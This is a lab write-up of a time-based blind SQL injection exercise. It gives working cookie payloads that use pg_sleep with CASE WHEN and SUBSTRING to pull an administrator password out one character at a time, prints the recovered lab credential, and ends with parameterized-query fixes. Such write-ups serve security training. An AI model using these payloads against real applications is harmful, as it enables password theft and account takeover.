# Lab: Blind SQL injection with time delays and information retrieval

**Category:** SQL Injection
**Difficulty:** Practitioner
**Objective:** Exploit time-based blind SQL injection to find the
administrator's password and log in.

## 0. Attacker mindset

The application gives no visible output and no erros. The only way to infer information is by observing the time the server takes to respond. If I can trigger a delay when a condition is true, I can extract data one character at a time by measuring the response time.

## 1. What is the vulnerability?

The `TrackingId` cookie is concatenated into a SQL query. The application does not return query results or errors, but the query is executed synchronously. By injecting a `CASE WHEN` statement that calls `pg_sleep()` only when a condition is true, the server's response time reveals whether the condition was met. This allows blind data extraction via time delays.

## 2. How did I exploit it?

### Step 1 - Identify the database and confirm time dealys work
Tested database-specific sleep functions. The payload:
```
TrackingId=x'||pg_sleep(10)--
```
caused a ~20-second delay, confirming PostgreSQL and that time-based injection was viable.

### Step 2 - Confirm the administrator user exists
```
TrackingId=x'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

A ~5-second delay confirmed the user exists.

### Step 3 - Extract the password character by character
Used `SUBSTRING` to isolate each position and tested against all alphanumeric characters. A `pg_sleep(3)` delay indicated the correct character.

Base payload:
```
TrackingId=x'||(SELECT CASE WHEN (SUBSTRING(password,N,1)='X') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

Where `N` is the position and 'X' is the character being tested.
Extracted the full password: `1pxmq21eijftixca0u6n`

### Step 4 - Log in
Used `administrator`:`1pxmq21eijftixca0u6n`. Lab solved.

## 3. Impact

- Complete password extraction despite no visible output or error messages.
- Time-based blind SQL injection is slow but reliable, working even when the application handles errors gracefully and returns generic responses.
- Full account takeover, including administrative access.

## 4. How can it be fixed?

- Use parameterized queries for all SQL operations.
- Do not concatenate user input (including cookies) into queries.
- Implement consistent response times regardless of query outcome, though this alone is complex and not a primary defense against time-based attacks.

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)